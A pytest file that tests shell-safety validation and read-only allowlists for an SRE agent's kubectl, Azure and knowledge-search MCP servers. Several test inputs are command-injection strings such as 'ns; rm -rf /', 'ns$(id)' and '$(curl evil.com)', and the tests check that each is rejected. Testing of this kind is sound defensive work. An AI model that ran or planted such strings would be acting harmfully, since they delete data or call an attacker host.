"""
Tests for the first-party MCP servers.

Two layers: direct unit tests against each tool function (fast, no
subprocess), and one integration test that spins up all three servers
over real stdio MCP transport via the loader — proving the wiring, not
just the Python functions, actually works.
"""
import pytest

from sre_agent.mcp_servers._shell import UnsafeArgumentError, run_readonly, validate_identifier


# --------------------------------------------------------------------------- #
# Shared shell-safety helper
# --------------------------------------------------------------------------- #

@pytest.mark.unit
def test_validate_identifier_accepts_normal_names():
    assert validate_identifier("payment-service", "namespace") == "payment-service"
    assert validate_identifier(
        "/subscriptions/0000/resourceGroups/rg/providers/Microsoft.Web/sites/app",
        "resource_id",
    )


@pytest.mark.unit
@pytest.mark.parametrize(
    "value", ["ns; rm -rf /", "ns`whoami`", "ns$(id)", "", "ns && curl evil.com"]
)
def test_validate_identifier_rejects_shell_metacharacters(value):
    with pytest.raises(UnsafeArgumentError):
        validate_identifier(value, "namespace")


@pytest.mark.unit
async def test_run_readonly_rejects_non_allowlisted_subcommand():
    with pytest.raises(UnsafeArgumentError):
        await run_readonly("kubectl", {"get", "describe"}, ["delete", "pod", "x"])


@pytest.mark.unit
async def test_run_readonly_rejects_empty_args():
    with pytest.raises(UnsafeArgumentError):
        await run_readonly("kubectl", {"get"}, [])


@pytest.mark.unit
async def test_run_readonly_executes_allowlisted_command():
    # `echo` stands in for a real binary; proves quoting + execution work.
    result = await run_readonly("echo", {"hello"}, ["hello", "world; rm -rf /"])
    assert "world; rm -rf /" in result  # passed as literal arg, not executed
    assert "no such file" not in result.lower()


# --------------------------------------------------------------------------- #
# kubectl-readonly tool functions (direct calls, no subprocess to kubectl)
# --------------------------------------------------------------------------- #

@pytest.mark.unit
async def test_kubectl_tools_reject_unsafe_namespace():
    from sre_agent.mcp_servers.kubectl_readonly import get_pods

    with pytest.raises(UnsafeArgumentError):
        await get_pods("ns; rm -rf /")


@pytest.mark.unit
async def test_kubectl_pod_logs_bounds_tail():
    from sre_agent.mcp_servers import kubectl_readonly as k

    captured = {}

    async def fake_run_readonly(binary, allowed, args):
        captured["args"] = args
        return "ok"

    k.run_readonly = fake_run_readonly  # type: ignore[attr-defined]
    await k.pod_logs("ns", "pod-1", previous=True, tail=999999)
    assert "--tail=2000" in captured["args"]  # clamped to the max
    assert "--previous" in captured["args"]


# --------------------------------------------------------------------------- #
# azure-readonly tool functions
# --------------------------------------------------------------------------- #

@pytest.mark.unit
async def test_azure_tools_reject_unsafe_resource_id():
    from sre_agent.mcp_servers.azure_readonly import resource_show

    with pytest.raises(UnsafeArgumentError):
        await resource_show("$(curl evil.com)")


@pytest.mark.unit
async def test_azure_metrics_list_validates_each_metric_name():
    from sre_agent.mcp_servers.azure_readonly import metrics_list

    with pytest.raises(UnsafeArgumentError):
        await metrics_list("/subscriptions/0/resourceGroups/rg", "Cpu,`whoami`")


@pytest.mark.unit
def test_azure_allowlist_has_no_mutating_verbs():
    from sre_agent.mcp_servers.azure_readonly import _ALLOWED

    assert _ALLOWED == {"resource", "monitor", "webapp", "aks"}
    # None of the allowlisted top-level groups permit reaching a mutating
    # verb through this server: every tool hardcodes 'show'/'list' as the
    # second argument, never taking it from caller input.


# --------------------------------------------------------------------------- #
# knowledge-search tool functions (in-process, uses AgentMemory)
# --------------------------------------------------------------------------- #

@pytest.mark.unit
async def test_knowledge_search_tools_use_shared_memory(tmp_path, monkeypatch):
    from sre_agent.mcp_servers import knowledge_search as ks
    from sre_agent.memory.unified import AgentMemory
    from sre_agent.memory.user_memories import UserMemoryStore

    ks._memory = AgentMemory(user_memories=UserMemoryStore(path=tmp_path / "mem.jsonl"))

    result = await ks.remember_fact("Production uses 3 AKS clusters in West US 2")
    assert "Saved as mem-" in result

    found = await ks.search_knowledge("AKS clusters West US")
    assert "West US 2" in found


@pytest.mark.unit
async def test_knowledge_search_empty_query_reports_no_match(tmp_path):
    from sre_agent.mcp_servers import knowledge_search as ks
    from sre_agent.memory.unified import AgentMemory
    from sre_agent.memory.knowledge_store import KnowledgeStore

    ks._memory = AgentMemory(incidents=KnowledgeStore(path=tmp_path / "kb.jsonl"))
    result = await ks.search_knowledge("completely unrelated nonsense query xyz")
    assert result == "No matching knowledge found."


# --------------------------------------------------------------------------- #
# End-to-end: real MCP stdio transport via the loader
# --------------------------------------------------------------------------- #

@pytest.mark.integration
async def test_all_first_party_servers_load_via_real_mcp_client():
    """Spins up all three servers as real subprocesses over stdio MCP."""
    from sre_agent.mcp.loader import load_mcp_tools

    tools = await load_mcp_tools()
    names = {t.name for t in tools}
    assert {
        "get_pods", "describe_pod", "pod_logs", "top_pods", "get_hpa",
        "resource_show", "resource_health", "metrics_list", "webapp_show", "aks_show",
        "search_knowledge", "remember_fact", "list_knowledge_documents",
    } <= names
    assert len(tools) == 13
